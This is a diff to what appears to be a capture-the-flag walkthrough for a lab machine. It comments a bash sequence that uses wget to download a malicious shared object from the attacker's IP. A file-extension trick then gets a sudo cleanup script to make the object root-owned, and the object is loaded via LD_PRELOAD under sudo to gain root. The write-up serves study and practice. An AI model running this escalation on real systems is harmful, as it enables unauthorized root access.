@@ -63,10 +63,15 @@ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 Wget the complie file to target /photobomb/source_images/ dir. The reason we put the file in that dir excuteing the cleanup script with sudo permision the file with jpg extention in that dir has change the ownership to root from that point we need to change our exploit file extention to jpg and excuteing the script its change the ownership . After that we change the extention back to .so and load the file to LD_PRELOAD varilable
 
 ```bash
+# getting file from attacker to remote machine
 wget http://10.10.16.8/pe.so
+# move pe.so to jpg extention to change the ownership
 mv pe.so pe.so.jpg 
+#run the cleanup scirpt
 sudo /opt/cleanup.sh
+# Back to the so extention
 mv pe.so.jpg pe.so
+# Command for load the pe.so along with cleanup.sh
 sudo LD_PRELOAD=~/photobomb/source_images/pe.so /opt/cleanup.sh
 ```
 
